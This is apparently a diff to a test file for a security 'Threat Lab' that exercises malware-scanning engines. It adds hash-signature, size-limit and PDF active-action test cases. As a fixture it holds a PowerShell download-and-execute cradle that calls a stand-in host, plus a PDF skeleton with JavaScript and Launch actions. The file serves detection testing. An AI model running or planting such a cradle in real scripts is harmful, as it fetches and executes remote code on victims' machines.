@@ -191,6 +191,8 @@ test("JB Threat Lab exercises Malware Engine, Security Guard and Expert QA again
         let extension = ".txt";
         let bytes;
         let expectedStatus;
+        let engine = malwareEngine;
+        let expectedReason;
         if (scenario.id === "malware.eicar.harmless-test") {
           bytes = EXPECTED_EICAR;
           expectedStatus = "malicious";
@@ -202,18 +204,50 @@ test("JB Threat Lab exercises Malware Engine, Security Guard and Expert QA again
           bytes = Buffer.from("IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/a')");
           expectedStatus = "suspicious";
           extension = ".ps1";
+        } else if (scenario.id === "malware.hash-signature.exact-match") {
+          bytes = HASH_FIXTURE;
+          expectedStatus = "malicious";
+          engine = hashSignatureEngine;
+          extension = ".bin";
+        } else if (scenario.id === "malware.coverage.size-limit-unknown") {
+          bytes = Buffer.alloc(128, 0x41);
+          expectedStatus = "unknown";
+          expectedReason = "size_limit";
+          engine = sizeBoundedMalwareEngine;
+        } else if (scenario.id === "malware.pdf.active-actions-suspicious") {
+          bytes = Buffer.from("%PDF-1.7\n1 0 obj\n<< /Type /Catalog /OpenAction 2 0 R /JavaScript 3 0 R /Launch 4 0 R >>\nendobj\n%%EOF\n", "latin1");
+          expectedStatus = "suspicious";
+          extension = ".pdf";
         } else {
           return outcome("skip", "No Malware Engine handler for this scenario");
         }
         const fixturePath = path.join(malwareFixtures, scenario.id.replaceAll(".", "-") + extension);
         await writeFile(fixturePath, bytes, { flag: "wx" });
-        const report = await malwareEngine.scanFile(fixturePath);
-        const passed = report.status === expectedStatus;
+        const report = await engine.scanFile(fixturePath);
+        const passed = report.status === expectedStatus &&
+          (expectedReason === undefined || report.reason === expectedReason) &&
+          (scenario.id !== "malware.pdf.active-actions-suspicious" ||
+            (report.detections.length === 0 && report.pdfAnalysis?.indicators.length >= 3));
         return outcome(
           passed ? "pass" : "fail",
-          passed ? "Malware Engine returned the expected static triage status" : "Unexpected Malware Engine status",
-          { actualStatus: report.status, expectedStatus, bytes: report.bytes, heuristicScore: report.heuristicScore },
-          passed ? [] : [{ code: "MALWARE_STATUS_MISMATCH", expected: expectedStatus, actual: report.status }]
+          passed ? "Malware Engine returned the expected static triage status" : "Unexpected Malware Engine status or coverage reason",
+          {
+            actualStatus: report.status,
+            expectedStatus,
+            reason: report.reason ?? null,
+            expectedReason: expectedReason ?? null,
+            bytes: report.bytes,
+            heuristicScore: report.heuristicScore ?? null,
+            detections: report.detections?.length ?? 0,
+            pdfIndicators: report.pdfAnalysis?.indicators.length ?? null
+          },
+          passed ? [] : [{
+            code: "MALWARE_STATUS_MISMATCH",
+            expected: expectedStatus,
+            actual: report.status,
+            expectedReason: expectedReason ?? null,
+            actualReason: report.reason ?? null
+          }]
         );
       }
     }
